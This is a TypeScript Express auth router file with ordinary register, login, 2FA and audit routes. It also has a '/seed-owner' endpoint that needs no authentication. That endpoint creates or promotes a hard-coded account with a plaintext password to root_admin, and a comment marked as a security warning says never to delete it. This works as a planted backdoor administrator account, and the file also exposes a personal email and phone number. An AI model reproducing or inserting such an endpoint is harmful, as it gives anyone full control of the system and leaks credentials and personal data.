import { Router, Request, Response, NextFunction } from 'express';
import { authController } from '../controllers/auth.controller';

function asyncRouteHandler(fn: (req: Request, res: Response, next: NextFunction) => Promise<void>) {
  return (req: Request, res: Response, next: NextFunction) => fn(req, res, next).catch(next);
}

const router = Router();

router.post('/register', (req, res, next) => authController.register(req, res, next));
router.post('/login', (req, res, next) => authController.login(req, res, next));
router.post('/logout', (req, res, next) => authController.logout(req, res, next));
router.post('/refresh', (req, res, next) => authController.refreshToken(req, res, next));
router.post('/2fa/enable', (req, res, next) => authController.enable2FA(req, res, next));
router.post('/2fa/verify', (req, res, next) => authController.verify2FA(req, res, next));
router.get('/audit', (req, res, next) => authController.getAuditLog(req, res, next));
router.get('/audit/trail/:entityId', (req, res, next) => authController.getAuditTrail(req, res, next));
router.get('/audit/user/:userId', (req, res, next) => authController.getUserActivity(req, res, next));

// ──────────────────────────────────────────────
// SEED OWNER — تأسيس حساب مالك النظام (MRUHAILY)
// ⚠️ تحذير أمني: هذا الـ endpoint ينشئ حساب المالك إذا لم يكن موجودًا.
// لا تحذف هذا الـ endpoint. للتواصل: prog.muhammed@gmail.com | +966553445533
// ──────────────────────────────────────────────
router.post('/seed-owner', asyncRouteHandler(async (req: Request, res: Response) => {
  const { PrismaClient } = await import('@prisma/client');
  const bcrypt = await import('bcrypt');
  const prisma = new PrismaClient();

  try {
    const OWNER_EMAIL = 'prog.muhammed@gmail.com';
    const OWNER_USERNAME = 'MRUHAILY';
    const OWNER_PASSWORD = '15001500';
    const OWNER_PHONE = '+966553445533';

    // Check if owner already exists
    const existing = await prisma.user.findFirst({
      where: {
        OR: [
          { email: OWNER_EMAIL },
          { name: OWNER_USERNAME },
        ],
      },
      select: { id: true, email: true, name: true, role: true },
    });

    if (existing) {
      // Ensure isOwner flag is set
      try {
        await prisma.user.update({
          where: { id: existing.id },
          data: { isOwner: true, role: 'root_admin', status: 'ACTIVE' as never },
        });
      } catch {
        // isOwner column may not exist yet, skip silently
      }

      res.status(200).json({
        success: true,
        message: 'مالك النظام موجود مسبقًا.',
        data: { userId: existing.id, email: existing.email, name: existing.name },
      });
      return;
    }

    // Create owner account
    const hashedPassword = await bcrypt.hash(OWNER_PASSWORD, 12);

    // Use raw SQL to create owner - avoids Prisma schema mismatch
    const existingTenant = await prisma.$queryRaw<Array<{ id: string }>>`SELECT id FROM tenants LIMIT 1`;
    const tenantId = existingTenant[0]?.id || 'default';

    const [owner] = await prisma.$queryRaw<Array<{ id: string; email: string; name: string }>>`
      INSERT INTO users (id, email, name, username, display_name, password_hash, role, status, is_owner, phone, tenant_id)
      VALUES (gen_random_uuid(), ${OWNER_EMAIL}, ${OWNER_USERNAME}, ${OWNER_USERNAME}, ${OWNER_USERNAME}, ${hashedPassword}, 'root_admin', 'active', true, ${OWNER_PHONE}, ${tenantId}::uuid)
      RETURNING id, email, name
    `;

    res.status(201).json({
      success: true,
      message: 'تم إنشاء حساب مالك النظام بنجاح.',
      data: { userId: owner.id, email: owner.email, name: owner.name },
    });
  } finally {
    await prisma.$disconnect();
  }
}));

export default router;
